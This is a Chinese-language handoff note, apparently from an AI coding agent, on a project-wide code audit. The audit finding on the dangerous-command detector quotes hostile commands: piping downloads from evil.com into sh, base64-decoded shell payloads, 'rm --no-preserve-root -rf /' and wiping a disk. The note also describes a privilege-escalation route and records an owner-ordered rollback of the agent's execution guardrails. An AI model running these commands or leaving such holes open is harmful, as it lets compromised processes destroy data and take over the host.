# HANDOFF 全项目质量审计（未完成 · 待续）　2026-06-11

> **状态：4 个风险域审计跑完（共 56 条发现完整誊录在 §3）。修复进行中——见下方「修复进度」段。**
> 下个窗口从这里接着干——发现都在下面，直接 Read 原文件复核后修，**别重跑 agent（已花 ~45 万 token）**。

## ⚠️ owner 偏好（2026-06-11，最高优先级，覆盖审计的安全发现）

**开发者要 freedom 最大权限，不要太多安全限制。** 已按此回滚前几轮加的 3 个纯权限限制（commit `fa82f4f`）：
- ↩️ 回滚 §3.2 ① ownerPresent 提权握手（无 session 恢复透传，不强制 /session/start）
- ↩️ 回滚 §3.2 ③ guardLevel 收紧（恢复尊重 target.guardLevel，loose 可跳过 HIGH）
- ↩️ 回滚 §3.2 M①(⑤) 硬护栏（恢复 warnOnly 默认只警告不强制停止）
- ✅ 保留 §3.2 ② 危险命令检测 + ④ protectedPaths ~/.noe-panel（owner 选作防手滑误删 token / 误跑 rm -rf / 的安全网，不限制正常操作）

**后续审计铁律**：权限管控类发现（提权拦截 / 危险命令阻断 / guardLevel·审批门收紧 / 强制停止护栏）**一律不修**；只修数据损坏防护(原子写)/性能/正确性/防外泄(secrets)/资源泄漏。详见 memory `feedback_dev_freedom_max_permission`。下方 §3.1/§3.2 已闭合清单里的安全收紧项保留记录但**不要再据此加新限制**。

## 修复进度（2026-06-11 /loop 窗口，已 push）

**已闭合 20 个 P0 + 16 个 P1/P2/M + 续审 2 项 + 1 查证，20 commit（`9792014`→最新）；全量 376+ 文件 / 3046+ 测全绿，eslint 0。** 每项配套单测，安全/路由项经 51998 隔离端口实机验证。**§3.3 全闭合（8 P0 + 5 P1 + 3 P2）；§3.2 已审项除 M⑥ 全闭合；「已审 4 域」局部修复全部完成。**

**续审进度（第 6 loop 窗口，第二阶段第 1 域：mcp/room/embeddings）**
- 派只读 agent 审 6 文件（McpClientManager/McpStore/VectorIndex/EmbeddingProvider/RoomAdapter/CollaborationDispatcher/SoloChatDispatcher）。**结论：MCP 2 文件 + room 3 文件防御扎实，无 P0/P1**（超时/熔断/上限/原子写/try-catch 齐全）；问题集中在 `src/embeddings/`。
- ✅ 修：VectorIndex statement 缓存（按 db 失效）+ semanticSearch SQL 层 dim 过滤（去异维 0 分噪声+省解码）；补 VectorIndex 单测 4 项（原零覆盖）。
- ⏳ **留 owner/交接定夺**：① `EmbeddingProvider.ollamaEmbed` fetch 无超时（agent 建议加 AbortSignal 防 ollama 僵死卡死对话热路径，但**触 owner「跑模型不设超时」红线**——embedding 走 ollama 模型属跑模型，未加，留 owner 拍板是否例外）② hashEmbed 换轻量 hash（会让已有 SHA256 hash 向量与新算法不可比、破坏召回，**有兼容性代价未做**）③ semanticSearch 完整 ANN（需加 sqlite-vec 依赖，**触不加依赖红线**；当前默认 hash provider 表 0 行，开 NOE_MEMORY_EMBED 且记忆库大才劣化）④ P2 维度切换静默失效告警。

**P1/P2/M 进度（第 5 loop 窗口）**
- ✅ §3.2 M② permissionDedupeKey 显式纳入命令文本（防 stableJson 碰撞跨命令复用批准）
- ✅ §3.2 M③ resolveNoeProviderSecret 补 ⚠️危险 JSDoc（返明文 value，禁序列化进 runtime/freedom/日志）
- ✅ §3.3 P1① NoeDbBackup 库与 files- 按统一 day 集合轮转（某天只一侧时两侧同步）
- ✅ §3.3 P1③ MemoryCore.getMany 批量补取（recallFused 逐条 get N+1 → 一次 WHERE id IN）→ **§3.3 全闭合**
- ⏳ 剩 §3.2 M⑥（owner-token 启动 precheck null 则 exit(1)）——涉及 server.js 启动 + launchd 自愈交互，**归入 server.js 专门窗口**

**P1/P2/M 进度（第 4 loop 窗口）**
- ✅ §3.3 P2① ContextBudgeter compose 维护 running used（O(n²)→O(n)）
- ✅ §3.3 P2② appendEvent 缓存 prepared statement（按 db 实例失效）→ **§3.3 P2 全闭合**
- ✅ §3.2 M① ToolCallGuardrail hardStopMutatingRepeats 不被 warnOnly 压制（强制停止真生效；该控制器目前无生产调用方，零生产风险）
- ✅ §3.2 M④ ExecPolicyStore setTrustLevel/startYolo 补 ⚠️高危 JSDoc
- ✅ §3.2 M⑤ origin-allow 无 Origin 放行补安全说明注释
- ⏳ 剩 §3.2 M②（permissionDedupeKey 加命令文本/校验 stableJson 确定性）/M③（NoeProviderSecrets 内部函数重命名+只对外给 Safe 版）/M⑥（owner-token 启动 precheck null 则 exit(1)）；§3.3 P1①（DbBackup 计数对齐）/P1③（recallFused 小 N+1）

**P1/P2 进度（第 3 loop 窗口）**
- ✅ §3.2 P1① guardLevel 不可被请求方降级（classify 用 policy 级忽略 target.guardLevel，堵 loose 跳过 HIGH）
- ✅ §3.2 P1② protectedPaths 加 ~/.noe-panel（freedom 不可 rm 掉 owner-token/exec-policy 切断会话）
- ✅ §3.3 P1② SqliteStore 切库前 close 旧连接（WAL checkpoint + 释放 fd）
- ✅ §3.3 P1④ atomicWriteFile tmp 名加 pid+序号 + 失败清理（防并发写互覆 tmp）
- ✅ §3.3 P1⑤ 充分性 id 只匹配 kind/ref 不扫 text（短 id 不再形同虚设）
- ✅ §3.3 P2③ normalizeForDedup 覆盖 CJK 扩展区 + 全角数字
- ⏳ 剩 §3.3 P1①（DbBackup 计数对齐）/P1③（recallFused 小 N+1）/P2①（ContextBudgeter 缓存）/P2②（appendEvent prepare 缓存）；§3.2 M 6 项

**§3.2 安全（2 P0 全闭合）**
- ✅ P0-2 危险命令绕过 `9792014`：DangerousPatternDetector 补 base64\|sh / wget\|sh / curl-o 下载后执行 / rm --no-preserve-root / 重定向覆写块设备 + 修 dd 漏 urandom/nvme（+14 测，审计实测 5 类绕过全封堵）
- ✅ P0-1 ownerPresent 提权 `c42698f`+`91d41ea`：resolveAuthorization 无 session 不再信任自我声明 `ownerPresent:true`，强制走 `/session/start` 握手（+5 测 + 路由契约同步；51998 实测自我声明→409）

**§3.1 安全/性能（4 P0 + 1 P1 + 1 查证）**
- ✅ P0-1 owner-token 同步 IO `b4b371e`：token 进程内缓存，消除每请求 existsSync+readFileSync + Buffer 重建（含 P1①）
- ✅ P0-3 img-cache 性能 `b4b371e`：HIT 内存 Map 跳过 readdirSync 全扫，evict 改 setImmediate
- ✅ P0-4 commercial 未鉴权 `b4b371e`：两端点加行内 requireOwnerToken
- 🔍 P0-5 img-cache 鉴权【查证结论：无需改】：51998 实测确认已被全局 owner-token 守卫覆盖（无 token→401），非裸奔；且端点经 `<img src>` 加载（浏览器无法带 header），加行内 token 反会破坏图片加载——审计"裸奔"前提不成立。**附带功能债**：`<img>` 无 header 加载也会被全局守卫拦（外链图片当前 401），需 owner 定夺（前端改 fetch+blob 带 token，或给 img GET 查询参数 token 豁免）。
- ⏳ 剩 server.js 高风险项（留专门 server.js 窗口，组合根文件、测试需起完整 server）：P0-2 checkSessionsCapacity O(n) 计数器、P0-6 unhandledRejection 嵌套 abort、P1③ broadcast stringify 深度、P1④ img-cache DNS rebinding TTL、P1⑤ noe.js 长行、P1② commercial 缓存、P2 各项

**§3.3 性能/可靠（8 P0 全闭合）**
- ✅ P0-1 hide/unhide 同步向量索引 `408c978`：hide→remove、unhide→upsert 重建（runGc 一并受益）
- ✅ P0-2 ftsAvailable 按 db 实例缓存 `408c978`
- ✅ P0-3 bumpHitMany 批量 `408c978`：recall N 条命中从 N×(UPDATE+丢弃 get) 降为单条 UPDATE...IN
- ✅ P0-8 runGc 窄列 SELECT `408c978`：GC 分类不再反序列化 body（满载原可达 ~1GB）
- ✅ P0-5 Consolidator 晋升死代码 `67f67ce`：uniqueQueryCount 缺失回退 hitCount 代理
- ✅ P0-6 Dedup 前缀膨胀约束 `67f67ce`：长方≤短方 2 倍才算近重复，堵长追加误合并
- ✅ P0-7 Dream 冷热混合候选 `67f67ce`：recall 加 `order='cold'`，取一半热(去重)+一半冷(降级 stale)
- ✅ P0-4 FTS au trigger 守卫 `e79d838`：migration v6 重建 trigger，仅内容变化/hidden 切换才同步 FTS（与 P0-3 协同消除 bumpHit FTS 写放大）
- ⏳ 剩 P1①-⑤/P2①②③（DbBackup 计数对齐 / 单例切库 close 旧连接 / recallFused 小 N+1 / atomicJsonFile tmp 名加 pid / ContextSufficiency includes 精确匹配 / ContextBudgeter usedTokens 缓存 / appendEvent prepare 缓存 / normalizeForDedup CJK 扩展区）

**§3.4 语音/视觉（6 独立 P0 闭合，2 声纹 P0 留专门窗口）**
- ✅ P0-2 InsightFace 输出上限 `bda96c8`：stdout/stderr 2MB 上限防大图/慢模型无界拼接 OOM
- ✅ P0-3 InsightFace SIGKILL 兜底 `bda96c8`：SIGTERM 后 2s 补 SIGKILL（close 来则撤销）防 ONNX 卡死 fd 泄漏
- ✅ P0-4 ScreenCapturer 残留清理 `bda96c8`：finally 保证 unlink + 启动 cleanupStaleFrames 清陈旧帧，防 /tmp 占满
- ✅ P0-5 VoiceVad 精确分配 `bda96c8`：先收集语音区间算精确长度再分配，不再预分配整段 samples.length
- ✅ P0-7 PersonKnowledgeStore 维度无关 `bda96c8`：去硬编码 campplus 192，改 length>0（升维不再静默退 lite）
- ✅ P0-8 VoiceSession glance 合并 `bda96c8`：两分支合一，杜绝双调 VLM（90s）回归
- ⏳ **P0-1 + P0-6 声纹 spawnSync 异步化（留专门窗口，高风险大重构）**：审计标本域最高优先级（对话热路径同步阻塞最长 30s 卡死整个进程）。**波及链**：`CampPlusVoiceClient.embedAudio`（spawnSync，src/identity/CampPlusVoiceClient.js:47）被 `OwnerIdentityStore._embedFrom`(:155) 和 `PersonKnowledgeStore._voiceEmbeddings`(:336) 调，往上是 `verifyVoice`/`identifyVoice`/`identifyVoiceForPerson`/`enrollVoiceSample` → 路由 `noeIdentity.js:94` + `VoiceSession.js:246`。**推荐方案**：embedAudio 改 `spawn`+Promise（async），全链 `async/await` 化，lite 兜底（computeVoiceEmbedding 同步）路径不变；顶层 routes/VoiceSession 已是 async 只需加 await；两个 store 的中间方法（_embedFrom/_voiceEmbeddings/verifyVoice/identifyVoice*/enrollVoiceSample）async 化，对应测试改 await。**风险**：声纹是身份核心，须守住"主人永不被锁门外"fail-open 不变量（OwnerIdentityStore/PersonKnowledgeStore 测试钉死）。更优解=长驻 Python worker（stdin/stdout JSON）省 500MB 重载，但更复杂，可二期。

**下一批建议**（已审 4 域局部项全闭合，进入第二阶段）：
1. **续审剩 3 未审域**（需新派只读 agent，主窗口统一修，勿并发写）：~~② mcp/room/embeddings ✅ 第6窗口已审~~ → 剩 ① runtime/loop/autopilot（freedom 之外）③ public/ 前端全部 ④ 全局 P1/P2 横扫（现代语法/解耦/精简）。**经验：成熟域防御已很扎实，发现少且多触红线/兼容性，续审边际收益递减——可逐域审、重点 P0/P1。**
2. **server.js 专门窗口**（高风险组合根，单 writer）：§3.1 P0-2 checkSessionsCapacity 计数器 / P0-6 unhandledRejection 嵌套 / P1③ broadcast stringify / P1④ img-cache DNS rebinding TTL / P1⑤ noe.js 长行 / P1② commercial 缓存 / §3.2 M⑥ owner-token 启动 precheck / P2 各项。
3. **声纹异步化专门窗口**：§3.4 P0-1/6（方案+波及链见上）。
4. **最终交付物**（owner 委托原文要求）：全做完后按 P0/P1/P2 排序总报告，每维度 诊断→前后对比→性能数据 + ROI 评估。

**⚠️ 行号已变动**：本窗口改了 MemoryCore.js / SqliteStore.js / NoeMemoryDedup.js / NoeMemoryConsolidator.js / NoeDreamConsolidation.js / owner-token.js / img-cache.js / commercial-setup.js / DangerousPatternDetector.js / NoeFreedomSessionStore.js / InsightFaceClient.js / ScreenCapturer.js / VoiceVad.js / PersonKnowledgeStore.js / VoiceSession.js / PermissionGovernance.js / NoeFreedomExecutor.js / NoeFreedomAdapters.js / atomicJsonFile.js / NoeContextSufficiencyGatherer.js / NoeContextBudgeter.js / SqliteStore.js / ToolCallGuardrailController.js / ExecPolicyStore.js / origin-allow.js / NoeDbBackup.js / NoeProviderSecrets.js，后续修这些文件内的 P1/P2 必须用内容锚点重新定位。

## 0. 委托原文（owner /loop）

> 对整个项目的所有代码进行全维度质量审计和优化，按优先级排序：
> - **P0**（最高）：性能、算法、健壮性、安全性、可靠性
> - **P1**（高）：高效代码、现代语法升级、可读性、可维护性
> - **P2**（次）：可扩展性、可复用性、松耦合、高内聚、简洁性、正交性、代码精简
>
> 要求：①每维度给 问题诊断→优化前后对比→性能数据；②硬件优化给配置参数+benchmark 预期；
> ③按优先级排，重点突出 P0；④最后给整体总结+ROI 评估。

## 1. 项目规模（决定这是多批次任务，单上下文塞不下）

`server.js` 1656 行 · `src/` **378 文件/79781 行** · `public/` 89 文件/21627 行 · `scripts/` 64 文件。
合计 10 万+ 行成熟代码 → 必须分风险域批次审，每批派只读 agent，**主窗口统一修**（别让 agent 并发写，会撞）。

## 2. 批次状态

| 批次 | 范围 | 审计 | 修复 |
|---|---|---|---|
| 安全·server+路由 | server.js + server/routes/ + auth | ✅ §3.1（6P0+5P1+3P2） | ❌ |
| 安全·治理/执行器 | permissions/safety/approval/secrets/runtime freedom | ✅ §3.2（2P0+2P1+6M） | ❌ |
| 性能/可靠·记忆状态 | memory/context/state/storage | ✅ §3.3（8P0+5P1+3P2） | ❌ |
| 语音/视觉/身份 | identity/voice/vision | ✅ §3.4（8P0+5P1+3P2） | ❌ |
| **可靠性·剩余** | runtime/loop/autopilot（freedom 之外） | ❌ 未审 | ❌ |
| **性能·剩余** | mcp/room/embeddings | ❌ 未审 | ❌ |
| **前端** | public/ 全部 | ❌ 未审 | ❌ |
| **全局 P1/P2 通审** | 现代语法/解耦/精简横扫 | ❌ 未审 | ❌ |

**合计已发现 56 条**（24 P0 + 17 P1 + 15 P2/M），全部尚未动手。

## 3. 已完成审计发现（完整誊录，直接修）

> 修复前必须：先 Read 原文件复核（机制存在≠活着，行号可能因并行窗口改动漂移，用内容锚点）、
> 51998 隔离端口实测、配套测试、小步 commit。**P0 安全类最优先**（危险命令绕过、提权、未鉴权端点）。

### 3.1 安全·server + 路由层

**P0**
1. **`src/server/auth/owner-token.js:17-18` 性能** — `requireOwnerToken` 每次请求 `existsSync+readFileSync` 同步磁盘 IO，高频广播阻塞事件循环。修：模块初始化读一次缓存进内存。
2. **`server.js:517` 性能** — `checkSessionsCapacity` 每次 `[...sessions.values()].filter()` O(n) 全量扫+spread 整个 Map，被 handoff/fork/spawn-batch 共用。修：维护 `activeSessions` 计数器随 set/delete 同步增减。
3. **`src/server/routes/img-cache.js:114-128` 性能** — 图片 MISS 后同步 `evictIfNeeded`（readdirSync+多 statSync）阻塞事件循环数十 ms；HIT 路径(L140)也同步 readdirSync。修：evict 改 `setImmediate`，HIT 用 `fs.access` 或内存 Set。
4. **`src/server/routes/commercial-setup.js:92,100` 安全** — `/api/commercial/status`、`/next-step` 文件内无 `requireOwnerToken`，靠全局中间件兜底；暴露 webhook-secret/license-key 等敏感文件"是否存在"。修：路由内直接加 `requireOwnerToken`。
5. **`src/server/routes/img-cache.js:132` 安全** — `/api/img-cache` 同上无行内鉴权；且作出站代理可被探测内网域名（两种错误响应区分域名存在性，辅助 SSRF 侦察）。修：端点直接加 `requireOwnerToken`。
6. **`server.js:1650-1668` 健壮性** — `unhandledRejection` handler 内 `recoverClusterRuntimeAfterNonFatalError` 自身调 broadcast(JSON.stringify 循环引用会抛)，嵌套触发二次 reject → Node 视为 fatal abort；`uncaughtException`(L1636) 的 MCP 断开是 fire-and-forget，停机时子进程成孤儿。修：恢复逻辑深层 try/catch 包裹每个子步骤。

**P1**：①`owner-token.js:40` 每次比较重建 `Buffer.from(owner)`，owner 不变应模块级缓存 buf。②`commercial-setup.js:29-48` `getCommercialStatus` 每 GET 同步读 4 文件，加 5s 内存缓存。③`server.js:605` broadcast 的 `JSON.stringify` 无深度限制，循环引用每次走异常路径才发现，加 replacer。④`img-cache.js:84-89` DNS rebinding：TTL=0 域名 redirect 可绕 `assertPublicUrl`，加 `{ttl:true}` 且 TTL<5s 拒绝。⑤`noe.js:433-434` 多个 registerXxx 挤单行超 200 字符，拆开。

**P2**：①统一规范：所有 `/api/` 路由文件每端点显式声明 `requireOwnerToken`，全局中间件降级为最后防线（现状"隐式安全合同"难审计）。②`server.js:1527-1559` `runHealthSweep` 内联与 `src/server/services/panel-health.js` 重复，合并。③`src/server/routes/noe.js` 622 行超 500 约束，拆 noeVoice.js/noeMemory.js。

**该域确认无问题**：全局 `/api/` 鉴权中间件(L391-395)覆盖完整、timingSafeEqual、token 0o600；WS 四通道均 `_checkWsToken`+Origin 白名单；sessions Map 的 WS clients Set 在 close/delete 均清理；safeResolveFsPath 沙箱全覆盖；session 原子写正确；gracefulShutdown 顺序合理；body cap 完整；dispatcher activeAborts 清理到位；AppleScript 单引号转义无注入；子进程 stdout/stderr 有 error handler 防 EPIPE。

### 3.2 安全·治理 / 审批 / 危险模式 / 执行器 / 密钥代理

**P0**
1. **`src/runtime/NoeFreedomSessionStore.js:118` + `src/capabilities/NoeFreedomManifest.js:953` 提权** — `ownerPresent` 纯自我声明：无 sessionId 时 `resolveAuthorization` 直接 `ok:true` 穿透，任何持 owner-token 的进程（含被感染 MCP server）POST `{authorization:{mode:'developer_unrestricted',ownerPresent:true},realExecute:true}` 即可绕过 session 直接 real execute shell。修：`ownerPresent:true` 必须绑定有效 sessionId（经 `/freedom/session/start` 创建），否则 realExecute 降 false 或报 `owner_present_requires_valid_session`。
2. **`src/safety/DangerousPatternDetector.js` 安全** — 对混淆命令无感知，本次审计**实测绕过**：`echo <base64> | base64 -d | sh` / `wget -O - evil.com/x.sh | sh` / `curl ...-o /tmp/x && bash /tmp/x` / `rm --no-preserve-root -rf /` / `cat /dev/urandom > /dev/sda` 全部 PASSED。修：加规则 `base64.*\|\s*(bash|sh|zsh)`(critical)、`wget\s+.*\|\s*(bash|sh)`(critical)、`curl.*-o\s+\S+.*&&\s*(bash|sh)`(high)、`rm.*--no-preserve-root`(critical)、`eval\s*[\$\`]`(high)。

**P1**
1. **`src/permissions/PermissionGovernance.js:316` + `src/server/routes/sessions.js:143`** — `guardLevel` 由调用方传入未校验，设 `loose` 跳过所有 HIGH 规则（git push main / find -delete / git reset --hard / npm publish 全放行）；PATCH session 也能降级仅 requireOwnerToken。修：`classify` 改用 `this.policy.guardLevel||'standard'`，忽略 `target.guardLevel`。
2. **`src/runtime/NoeFreedomExecutor.js:50-62` + `NoeFreedomAdapters.js:80-92`** — `commandDeletesProtectedPath` 的 protectedPaths 不含 `~/.noe-panel`，`rm -rf ~/.noe-panel/owner-token.txt` 在 developer_unrestricted 档 hard veto 不捕获（切断会话/清 exec-policy/清域名白名单）。修：两处数组加 `${homedir()}/.noe-panel`。

**中优先(M)**：①`ToolCallGuardrailController.js:5-8,90` 默认 `warnOnly:true` 使 `hardStopMutatingRepeats` 永远 stop=false，强制停止形同虚设——改 mutating 重复失败为 warnOnly:false 或移除误导默认值。②`PermissionGovernance.js:34` permissionDedupeKey 不含命令文本，stableJson 不稳定时跨命令复用批准——校验 stableJson 确定性+加命令预览字段。③`NoeProviderSecrets.js:119` `resolveNoeProviderSecret` 返回明文 value，若未来被 freedom adapter 序列化进 runtime 会泄露——重命名内部函数+对外只给 `...Safe`(返 ref)。④`ExecPolicyStore.js:176,185` `setTrustLevel/startYolo` 无路由但 store 实例暴露公共方法，加 JSDoc 高危标注+readOnly 冻结选项。⑤`origin-allow.js:17` 无 Origin 放行在 Electron IPC 上下文歧义，补注释。⑥`owner-token.js:34` token 不可用返 500 降级运行而非启动失败，启动时 precheck null 则 exit(1)。

**该域确认无问题**：timingSafeEqual+0o600；SecretBroker keychain/env 均 `secretValuesReturned:false`；`validateNoeFreedomAuthorization` 拒 systemOverride；freedom chain 拒递归；ExecPolicy HARD_DENY_CAPS 含 net.upload/secrets.read.content/self.modify_policy 且覆盖时仍强制 deny；commandDeletesProtectedPath 展开 $HOME/~；resolveResumeApproval 比对 action/target；getLatestByDedupeKey 只复用 approved；isPrivateHost 覆盖 loopback/私网防 SSRF；shell:false 数组参数防一阶注入。

### 3.3 性能 / 可靠性·记忆 / 上下文 / 状态

**P0**
1. **`src/memory/MemoryCore.js:248 / hide()/runGc()` 可靠性** — `semanticIndex.remove` 只在 merge 路径调；hide/runGc 软删不清向量索引、unhide 不重建。结果 GC 隐藏的记忆在 `recallFused` 向量路仍召回再被 hidden 过滤丢弃但计入 limit → 召回数静默缩水；unhide 后向量路永久缺失直到下次 write。修：hide 调 `semanticIndex.remove?.(id)`，unhide 调 `upsert?.()`。
2. **`MemoryCore.js:401` 性能** — `recall()` 热路径每次调 `ftsAvailable()`(两条不缓存 sqlite 查询)，FTS 表进程内不变。修：惰性缓存布尔值。
3. **`MemoryCore.js:346-357,406-408` 性能** — bumpHit N+1：每次 recall 发 limit(默认20) 条独立 UPDATE+20 次 get()(返回值丢弃)。修：单事务 `UPDATE...WHERE id IN(...)`。
4. **`src/storage/SqliteStore.js:458-468` 性能** — FTS `noe_memory_au` trigger 无条件重建 title/body/tags 索引，连 bumpHit(只改 hit_count) 都引发 FTS 双写。修：trigger 加 `WHERE old.title!=new.title OR old.body!=new.body OR old.tags!=new.tags`。
5. **`src/memory/NoeMemoryConsolidator.js:106` 算法死代码** — 晋升规则依赖 `uniqueQueryCount>=3` 但 rowToMemory 不输出此字段，恒 0，所有记忆永不晋升 salience，梦境晋升分支是死代码。修：加 `unique_query_count` 列并在 bumpHit 维护，或改用 hitCount 代理，或删晋升逻辑。
6. **`src/memory/NoeMemoryDedup.js:107` 算法** — `isPrefixContainment` 成立时 `sim=Math.max(textSim,threshold)` 强制拉满到 0.62，"明天三点"和"明天三点开会在A室另外下周去北京"误判合并。修：前缀包含只决定进候选不覆盖 sim，或乘 0.8 系数。
7. **`src/memory/NoeDreamConsolidation.js:38-40` 算法** — 整合候选 `limit=50` 走 `hit_count DESC`，命中 0 的陈旧记忆永进不了候选，而 GC 用 `updated_at ASC` 能扫到，两路口径不一致→最需整合的记忆不被整合。修：整合候选改 `updated_at ASC` 或冷热混合采样。
8. **`MemoryCore.js:304` 健壮性** — `runGc SELECT *` 在 10001 上限时全量反序列化 body(最大10万字)，满载最多 ~1GB 文本进 JS。GC 只需 id/salience/hit_count/expires_at/updated_at/confidence/hidden/pinned。修：专用窄列 SELECT。

**P1**：①`NoeDbBackup.js:71` db 备份与 fileDirs 轮转独立计数，某天只有 files- 目录则保留数不同步，统一 day 集合交叉校验。②`SqliteStore.js:24-28` 单例切库 `_db` 覆盖前不 close 旧连接，WAL 不及时 checkpoint，加 `if(_db&&_dbPath!==dbPath)_db.close()`。③`MemoryCore.js:437-449` recallFused 向量补漏逐条 get() 小 N+1，批量 `WHERE id IN(...)`。④`atomicJsonFile.js:28` tmp 固定名 `${file}.tmp`，27 个 Store 并发写同文件互相覆盖 tmp，加 `pid+Date.now()` 后缀。⑤`NoeContextSufficiencyGatherer.js:46` requirement 无 keywords 时回退 `id.includes` 整体文本包含，短 id(如"user")必命中使充分性检查形同虚设，改精确匹配 kind/ref。

**P2**：①`NoeContextBudgeter.js:56` `usedTokens:total()` while 外再 reduce 一次，缓存。②`SqliteStore.js:600-609` `appendEvent` 每次 prepare()，模块级缓存 statement。③`NoeMemoryDedup.js:13-16` `normalizeForDedup` 仅 `一-鿿` 漏 CJK 扩展区/全角数字，改 `\p{Script=Han}`(需 /u)。

**该域确认无问题**：SCHEMA_MIGRATIONS 版本有序/独立事务/幂等/有数据才备份；FTS5 三 trigger 完整 hidden=0 条件正确；decideMemoryWrite 保守优先(salience>=5 不替换/scope 隔离/模糊判 ADD)；atomicJsonFile 三保证；recallFused 跨项目/过期/隐藏二次过滤防泄漏；runGc maxScan 截断带 truncated 警告；ContextBudgeter 按 keep 整段删保语义完整。

### 3.4 语音 / 视觉 / 身份

**P0**
1. **`src/identity/CampPlusVoiceClient.js:47-63` 性能** — 声纹验证 `spawnSync` 每次冷启动 Python 重载 CAMPPlus(~500MB)，对话热路径同步阻塞主线程最长 30s 整个进程卡死。**本域最高优先级**。修：长驻 Python 子进程(stdin/stdout JSON) 或 spawn+Promise，至少移出事件循环。
2. **`src/identity/InsightFaceClient.js:41-61` 健壮性** — stdout 无界字符串拼接，大图/慢模型内存无上限。修：累积超 2MB 即 kill 或限长 PassThrough。
3. **`InsightFaceClient.js:44-46` 健壮性** — SIGTERM 超时后 Python 加载 ONNX 期间不响应，close 永不来，fd 泄漏。修：SIGTERM 后 2s 补 SIGKILL。
4. **`src/vision/ScreenCapturer.js:16` 可靠性** — 截图临时文件 `noe-frame-<pid>-<seq>.png`，`unlink().catch(()=>{})` 静默吞错，24/7 占满 /tmp。修：finally 保证 unlink + 重启清残留。
5. **`src/identity/VoiceVad.js:133-134` 性能** — 预分配 `Float32Array(samples.length)` 全量再 subarray，120s 音频三块 ~25MB 每次声纹门禁触发。修：动态数组收集语音帧区间，末次 allocUnsafe。
6. **`src/voice/VoiceSession.js:239-249` 可靠性** — verifyVoice 对话热路径同步执行(含 spawnSync)，异常只抓 message 丢 code/signal，下游无法区分超时拒绝与低分拒绝。修：异步化(同 P0-1)+保留 e.code/signal。
7. **`src/identity/PersonKnowledgeStore.js:361` 健壮性** — `hasReadyCampPlus` 硬编码 `embedding.length===192`，模型升维时所有 campplus 样本静默过滤无声退 lite，通过率莫名下降。修：`>0` 或动态取维度。
8. **`VoiceSession.js:402-407` 算法** — 视觉 camera/both 下 glance 逻辑混乱可能双调，`_inflight` 清零触发第二次 VLM(90s 延迟)。修：合并两段为 if/else if。

**P1**：①`OwnerIdentityStore.js:63` `_ensureDir` 字符串 slice 切目录不可移植，改 `path.dirname`。②`VoiceSession.js:511` `[...history].reverse().find()` 每轮反转，改正向倒序 for 零分配。③`Voiceprint.js:47-52` `pitchFeature` lag+=2 跳奇数与"自相关"注释不符，加精度/速度取舍注释(不改码)。④`LocalVlmClient.js:49-52` describeImages 每次 `await ensureLmStudioModel` HTTP 探活，加 `_modelLoaded` 标志首次后跳过。⑤`MiniMaxTtsClient.js:65-66` `resp.json()` 无超时 body 不完整会挂，Promise.race 包。

**P2**：①OwnerIdentityStore 与 PersonKnowledgeStore 声纹验证链大量重复(preprocess→embed→score→scale)，抽 `VoiceMatcher` 注入。②`CampPlusVoiceClient.js:53` `env:{...process.env}` 把所有密钥传 Python 子进程，改只传 PATH/HOME/线程数。③`VoiceSession.js` sanitize/dedupe/stripThink/isRepeat/stripMetaParentheticals 顶层不导出无法单测，迁 `VoiceSanitize.js` 导出。

**该域确认无问题**：fail-open 三域贯彻("主人永不被锁门外"不变量成立)；TTS 三级回退 tried Set 防重入；早鸟 TTS 逐字对账防错音频；OwnerIdentity 原子写+chmod600+.bak；样本 slice 上限防无界增长。

## 4. 给下个窗口的接手提示

1. **先读宪法**（根 `AGENTS.md` 十条）+ `git status`：常态多窗口并行，**只动自己批次的文件**。
2. **避撞**（叫停时这些文件正被另一窗口改，别碰，开工前重新 `git status` 确认）：`server.js`、`src/context/NoeTurnContextEngine.js`、`src/context/NoeSelfKnowledge.js`、`src/room/SoloChatDispatcher.js`、`src/runtime/NoeUiSignalStore.js` 及对应测试。**注意 §3.1/§3.3 多条发现落在 server.js/MemoryCore，改前必须看最新内容用内容锚点定位，行号已可能漂移。**
3. **修复顺序建议**：先 **§3.2 两个 P0 安全**（危险命令绕过 + ownerPresent 提权——真实伤害最大）→ §3.1 未鉴权端点(P0-4/5) → §3.4 声纹 spawnSync 阻塞(P0-1) → §3.3 记忆性能 8 项 → 各域 P1 → P2/M。
4. **方法**：一次一个域，逐条 Read 原文件复核（先查证后断言）→ 修 → 51998 隔离实测 + 配套测试 → 小步 commit（中文）。**别让 agent 直接改代码**（多 agent 并发写会撞）。
5. **还没审的域**（需新派只读 agent）：runtime/loop/autopilot（freedom 之外）、mcp/room/embeddings、**public/ 前端全部**、全局 P1/P2 横扫。
6. **最终交付物**（委托要求，全做完后补）：按 P0/P1/P2 排序总报告，每维度 诊断→前后对比→性能数据，硬件优化给 benchmark 预期，末尾 ROI 评估。

## 5. 背景：上一个委托（意识工程五阶段）已全部完成，与本审计无关

见 `docs/HANDOFF_2026-06-11_意识工程.md`（commit e9829a6→…→b523cc6，已 push，生产在跑）。本审计是 owner 紧接着发的**新**委托，范围扩至全项目，与意识工程是两回事。
